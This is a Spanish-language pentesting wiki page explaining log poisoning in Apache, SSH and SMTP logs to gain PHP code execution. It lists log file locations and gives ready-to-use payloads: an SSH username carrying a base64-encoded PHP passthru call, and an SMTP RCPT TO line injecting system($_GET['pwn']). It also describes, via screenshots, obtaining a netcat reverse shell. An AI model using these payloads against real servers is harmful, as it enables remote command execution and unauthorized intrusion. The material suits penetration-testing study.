# Log Poisoning (Apache, SSH y SMPT)

## Links:

[**Apache Logs**](log-poisoning-apache-ssh-y-smpt.md#apache-logs)

[**SSH Logs**](log-poisoning-apache-ssh-y-smpt.md#ssh-logs)

[**SMPT Logs**](log-poisoning-apache-ssh-y-smpt.md#smtp-logs)



## Apache Logs&#x20;

Este ataque consiste en que si el usuario www-data tiene capacidad de lectura del archivo de **logs de apache**, poder modificar el contenido de este a través de una **cabecera HTTP** para que el navegador al acceder a este recurso ejecute código PHP arbitrario.

### Locations

RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – /var/log/httpd/access\_log

FreeBSD Apache access log file location – /var/log/httpd-access.log

Debian / Ubuntu Linux Apache access log file location – /var/log/apache2/access.log

### Explotación

Si se cuenta con capacidad de lectura del archivo de logs, se puede modificar la cabezar HTTP **User-Agent** con una línea de código php para que al abrirse el archivo de logs el navegador interprete el código php que hayamos inyectado, bien sea a través de la url o un comando directamente.

En este caso haremos que php ejecute como comando de sistema todo la data que viaje por el método GET:

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Ahora cuando accedamos al fichero de logs podremos ejecutar comandos, en este caso que nos establezca una reverse shell a través de netcat:

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Máquina atacante:

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>



## SSH Logs

Este ataque consta de si el **servicio SSH está abierto** y el usuario www-data tiene capacidad de lectura del fichero de **logs de ssh**, es posible modificar este fichero para que el navegador al abrirlo ejecute código PHP.

### Location

/var/log/auth.log

Lo que tenemos que hacer ahora es loguearnos como el usuario, debido a que tiene muchos símbolos que pueden generar conflicto en la bash, lo vamos a encodear en base64, usando una función de php para que lo decodee una vez lo interprete el navegador y posteriormente lo ejecute:

{% code overflow="wrap" %}
```bash
ssh "<?php passthru(base64_decode(<Command in base64>)); ?>"@<TARGET-IP>
# JF9HRVRbJ3B3bidd == $_GET['pwn']
ssh "<?php passthru(base64_decode('JF9HRVRbJ3B3bidd')); ?>"@192.168.182.129
```
{% endcode %}

_passthru:  Execute an external program and display raw output_

Ahora cuando accedamos al fichero auth.log podremos pasarle un parámetro con el cual vamos a ejecutar comandos, en este caso una reverse shell a través de netcat:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Shell obtenida:

<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>



## SMTP Logs

Este ataque consiste en que si hay un puerto **SMPT abierto**, pudiendo conectarnos a este para mandar un mail Y el usuario www-data tiene capacidad de lectura del archivo de **logs de smpt** se pueda ejecutar código PHP arbitrario a través de enviar un mail con una línea de código PHP en el remitente/receptor.

### Location

/var/log/mail.log

### Explotación

Lo primero será enviar un mail y en el campo del remitente/receptor poner el código php a ejecutar:

{% code overflow="wrap" %}
```bash
telnet <TARGET-IP> 25

MAIL FROM:evil-hacker   
250 2.1.0 Ok
RCPT TO:<?php system($_GET['pwn']); ?>
501 5.1.3 Bad recipient address syntax # Esto se ignora debido a que el servidor espera un ID y no un código php
```
{% endcode %}

